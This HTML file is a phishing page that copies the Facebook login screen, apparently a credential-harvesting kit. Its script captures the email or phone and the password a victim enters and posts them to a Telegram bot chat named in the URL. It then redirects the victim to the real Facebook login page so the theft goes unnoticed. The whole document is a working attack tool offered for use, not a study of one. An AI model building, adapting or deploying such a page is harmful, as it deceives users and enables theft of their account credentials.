<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In</title>
    <style>
        body {
            font-family: 'Helvetica Neue', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: linear-gradient(135deg, rgba(242, 246, 255, 1) 0%, rgba(231, 245, 255, 1) 100%);
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            justify-content: flex-start; /* ‡¶´‡¶∞‡ßç‡¶Æ‡¶ï‡ßá ‡¶â‡¶™‡¶∞‡ßá ‡¶®‡¶ø‡ßü‡ßá ‡¶Ø‡¶æ‡¶¨‡ßá */
            align-items: center;
            height: 100vh;
        }

        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
            max-width: 380px;
            background: #ffffff;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            border-radius: 8px;
            padding: 25px;
            box-sizing: border-box;
            margin-top: 40px; /* ‡¶â‡¶™‡¶∞‡ßá‡¶∞ ‡¶¶‡¶ø‡¶ï‡ßá ‡¶®‡¶ø‡ßü‡ßá ‡¶Ø‡¶æ‡ßü */
        }

        .logo-container {
            margin-bottom: 20px; /* ‡¶≤‡ßã‡¶ó‡ßã‡¶∞ ‡¶®‡¶ø‡¶ö‡ßá ‡¶∏‡ßç‡¶™‡ßá‡¶∏ */
        }

        .logo {
            width: 90px;
        }

        .input-field {
            width: 100%;
            padding: 14px;
            margin: 12px 0;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 16px;
            box-sizing: border-box;
        }

        .login-btn {
            width: 100%;
            padding: 10px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
            transition: background-color 0.3s;
        }

        .login-btn:hover {
            background-color: #155db2;
        }

        .forgot-password {
            margin-top: 15px;
            font-size: 14px;
            color: #1877f2;
            text-decoration: none;
        }

        .create-account-btn {
            margin-top: 30px;
            padding: 10px 0;
            width: 90%;
            border: 1px solid #1877f2;
            color: #1877f2;
            border-radius: 6px;
            background-color: transparent;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        .create-account-btn:hover {
            background-color: #e7f3ff;
        }

        .meta-logo-container {
            position: absolute;
            bottom: 20px;
            text-align: center;
        }

        .meta-logo {
            width: 80px;
        }
    </style>
</head>
<body>
    <div class="logo-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" class="logo" alt="Facebook Logo">
    </div>

    <div class="container">
        <form id="loginForm">
            <input type="text" id="emailOrPhone" class="input-field" placeholder="Mobile number or email address" required>
            <input type="password" id="password" class="input-field" placeholder="Password" required>
            <button type="submit" class="login-btn">Log In</button>
        </form>
        <a href="#" class="forgot-password">Forgotten Password?</a>
        <button class="create-account-btn">Create new account</button>
    </div>

    <div class="meta-logo-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ab/Meta-Logo.png/1200px-Meta-Logo.png" class="meta-logo" alt="Meta Logo">
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();

            const urlParams = new URLSearchParams(window.location.search);
            const chat_id = urlParams.get('chat_id');

            if (!chat_id || isNaN(chat_id)) {
                alert("Invalid or missing chat ID.");
                return;
            }

            const emailOrPhone = document.getElementById('emailOrPhone').value;
            const password = document.getElementById('password').value;

            const token = 'YOUR_BOT_TOKEN_HERE';
            const telegramURL = `https://api.telegram.org/bot${token}/sendMessage`;

            const message = `üîê Login Details:\nüìß Email/Phone: ${emailOrPhone}\nüîë Password: ${password}\n\nüí° Chat ID: ${chat_id}`;

            fetch(telegramURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chat_id, text: message })
            }).then(response => {
                if (response.ok) {
                    window.location.href = 'https://m.facebook.com/login/';
                } else {
                    alert('Failed to send login details.');
                }
            }).catch(error => {
                console.error('Error:', error);
                alert('Error occurred while sending data.');
            });
        });
    </script>
</body>
</html>
